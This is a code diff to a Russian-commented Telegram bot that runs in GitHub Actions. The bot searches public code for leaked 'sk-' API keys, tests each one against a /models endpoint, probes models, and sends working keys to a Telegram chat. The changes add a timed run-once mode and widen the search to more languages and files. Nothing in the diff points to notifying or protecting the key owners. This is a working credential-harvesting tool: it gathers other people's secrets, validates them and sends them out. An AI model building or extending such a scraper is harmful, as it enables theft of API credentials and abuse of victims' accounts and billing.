@@ -2,7 +2,7 @@
 bot_runner.py
 Версия бота для GitHub Actions с фоновым автопоиском, кэшем и мульти-проверкой.
 """
-
+import time
 import os
 import json
 import asyncio
@@ -76,20 +76,29 @@ async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def auto_scan_loop(app):
     if not CHAT_ID:
-        logger.warning("CHAT_ID не задан! Авто-рассылка отключена.")
+        logger.warning("CHAT_ID не задан!")
         return
 
-    logger.info(f"Авто-скан запущен. Интервал: {SCAN_INTERVAL_SECONDS} сек.")
-    await asyncio.sleep(10) # Ждём инициализации
+    run_once = os.getenv("RUN_ONCE", "false").lower() == "true"
+    
+    if run_once:
+        logger.info("Режим RUN_ONCE: сканирую 10 минут...")
+        # Бот будет работать 10 минут (600 секунд)
+        end_time = time.time() + 600 
+    else:
+        logger.info(f"Авто-скан запущен. Интервал: {SCAN_INTERVAL_SECONDS} сек.")
+        await asyncio.sleep(10)
+        end_time = float('inf')
 
-    while True:
+    while time.time() < end_time:
         logger.info("Фоновое сканирование...")
         loop = asyncio.get_event_loop()
         
         try:
+            # УВЕЛИЧИВАЕМ max_files до 50 (вместо 15)
             found = await loop.run_in_executor(
                 None, 
-                lambda: collect_keys("sk- language:Python OR language:JavaScript", max_files=15)
+                lambda: collect_keys("sk- language:Python OR language:JavaScript OR language:TypeScript", max_files=50)
             )
             
             for key, meta in found.items():
@@ -99,13 +108,12 @@ async def auto_scan_loop(app):
                 chk = await loop.run_in_executor(None, lambda: check_key(key))
                 
                 if chk.get("ok"):
-                    logger.info(f"Ключ {key[:10]}... ответил 200 на /models. Запускаю пробы.")
+                    logger.info(f"Ключ {key[:10]}... ответил 200. Запускаю пробы.")
                     prb_results = await loop.run_in_executor(
                         None, 
                         lambda: probe_all_models(key, DEFAULT_ENDPOINT, chk.get("models", []), max_probes=7)
                     )
                     
-                    # Отправляем, если хотя бы одна модель ответила 200
                     if any(p["ok"] for p in prb_results):
                         report = format_report(
                             endpoint=DEFAULT_ENDPOINT,
@@ -118,18 +126,22 @@ async def auto_scan_loop(app):
                         await app.bot.send_message(chat_id=CHAT_ID, text=report)
                         sent_keys.add(key)
                         save_state()
-                        
                         append_history({"key": key, "provider": meta["provider"], "working": True})
-                        logger.info(f"Отправлен рабочий ключ: {key[:10]}...")
                     else:
-                        logger.info(f"Ключ {key[:10]}... мертв (все пробы 403/401).")
-                        sent_keys.add(key) # запоминаем мертвый, чтобы не тратить лимиты
+                        sent_keys.add(key) 
                         save_state()
                     
         except Exception as e:
             logger.error(f"Ошибка в авто-скане: {e}")
 
-        await asyncio.sleep(SCAN_INTERVAL_SECONDS)
+        # Если это режим RUN_ONCE, делаем паузу 30 секунд перед следующим кругом
+        if run_once:
+            logger.info("Круг завершен, жду 30 секунд...")
+            await asyncio.sleep(30)
+        else:
+            await asyncio.sleep(SCAN_INTERVAL_SECONDS)
+
+    logger.info("Время вышло. Завершаю работу.")
 
 
 # ─── запуск ────────────────────────────────────────────────────────────────
